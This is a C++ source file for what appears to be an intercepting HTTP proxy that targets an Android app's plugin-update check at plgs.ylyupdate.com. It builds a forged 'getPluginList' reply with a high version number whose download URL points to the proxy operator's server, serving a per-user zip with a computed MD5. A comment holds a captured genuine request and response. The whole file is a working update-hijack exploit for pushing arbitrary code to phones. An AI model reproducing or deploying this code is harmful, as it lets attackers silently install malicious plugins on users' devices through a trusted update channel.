#include "qitu.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "PluginServer.h"



int QituAndroid::isQituAndroid(const char * url, const char * host) {
	if (strstr(host, "plgs.ylyupdate.com") && strstr(url, "/pluginweb/facademanage/getPluginList.action"))
	{
		return TRUE;
	}

	return FALSE;
}


int QituAndroid::replyQituAndroid(char * dstbuf, int size, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {
	char * szHttpFormat = "HTTP/1.1 200 OK\r\n"
		"Content-Type: text/html;charset=UTF-8\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	int ret = 0;
	string version = "9991";

	string strip = HttpUtils::getIPstr(gServerIP);

	string url = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

	unsigned char hexmd5[64] = { 0 };
	string zipfn = "qituplugin.zip";
	string filename = Public::getUserPluginPath(lphttp->username) + zipfn;
	char szmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(filename, szmd5, hexmd5, 1);

	char hdrformat[4096];
	char szformat[] =
		"{\"success\":true,\"message\":\"success\",\"results\":0,\"data\":{\"ipAddress\":\"%s\","
		"\"pluginList\":[{\"areaIds\":\"\",\"downNum\":\"1000\",\"downloadUrl\":\"http://%s/%s\",\"isWork\":\"1\",\"maxNum\":\"10000\","
		"\"md5\":\"%s\",\"onlyWifiDownload\":\"0\",\"packageName\":\"com.yly.mob.feeds.resouce\","
		"\"pluginAppSize\":\"%u\",\"pluginId\":\"1163\",\"pluginName\":\"YLY_FEEDS_SDK\",\"triggerIds\":\"\",\"triggerList\":[],"
		"\"versionCode\":\"%s\",\"versionName\":\"V9.9.9.1\"}],\"pollingLimit\":\"3\",\"pollingTime\":\"600\"}}";

	int httphdrlen = sprintf_s(hdrformat, 4096, szformat, strip.c_str(), url.c_str(), zipfn.c_str(), szmd5, filesize,version.c_str());

	int retlen = sprintf(dstbuf, szHttpFormat, httphdrlen, hdrformat);
	return retlen;
}



/*
POST /pluginweb/facademanage/getPluginList.action HTTP/1.1
Accept-Encoding: identity
Connection: keep-alive
User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SCL-TL00H Build/HonorSCL-TL00H)
Host: plgs.ylyupdate.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 692

KEY=BF2268D15C43FB90450B3B9CB4E9B1633DCB88AFCD8D3D27E16F2886FEF0419B0C5C634DE0E6FA23E79CC89E02E4EE966EC533B68F62A6D52E72225D38B9A4F926CF7D6C568DC8D4E5548DF1DAEF35C25329CBFB2B3D93A1E888EBFD8849B741D3AAFFF85D613271E4399558BEFEC281EBCF42A9E93E3A5551A9D73A4F1D2CE89216D62EFCE3D6929AE28949913936F6E25D26260B2F2B2B0A8CB1CCB4766DA224A4ABAD5FB90211F62FB88D4D88C1D0542470A8BF1385246A0DA44FD275292AAC23DD79FB48CB9F05AA30B4D5FFCC188C94C54CEAB3C14B42438D54C0B340737BF1A4DDE1F7272A4B5ED8EEB4A0F101008F8E35A355E7470D1621C3BC9BD4902C324EEFD11FD8557F8A6B5CA07C9663D5B7439527779B89D98ADABF1141C58D371371AEEB3E84FEF49DA655E891FDD0404729DA2DAE8C85D998C1D3C071DD3D5F50F459524B30242838BCD939F7D7FCE11D8391F1131D4A

HTTP/1.1 200 OK
Server: openresty/1.9.15.1
Date: Wed, 24 Jun 2020 15:23:06 GMT
Content-Type: text/html;charset=UTF-8
Content-Length: 544
Connection: keep-alive
Set-Cookie: JSESSIONID=BA4BFD30264B606C85E5C86877463BC4; Path=/pluginweb/; HttpOnly

{"success":true,"message":"success","results":0,"data":{"ipAddress":"120.78.246.228","pluginList":[{"areaIds":"","downNum":"1000","downloadUrl":"http://cdn.ylyupdate.com/pluginweb/upload/plugin/1061579070682708.1","isWork":"1","maxNum":"10000","md5":"4c931ab3df92df4fdf8400e74e714a75","onlyWifiDownload":"1","packageName":"com.yly.mob.feeds.resouce","pluginAppSize":"6111764","pluginId":"1163","pluginName":"YLY_FEEDS_SDK","triggerIds":"","triggerList":[],"versionCode":"1601","versionName":"V1.6.0.1"}],"pollingLimit":"3","pollingTime":"600"}}
*/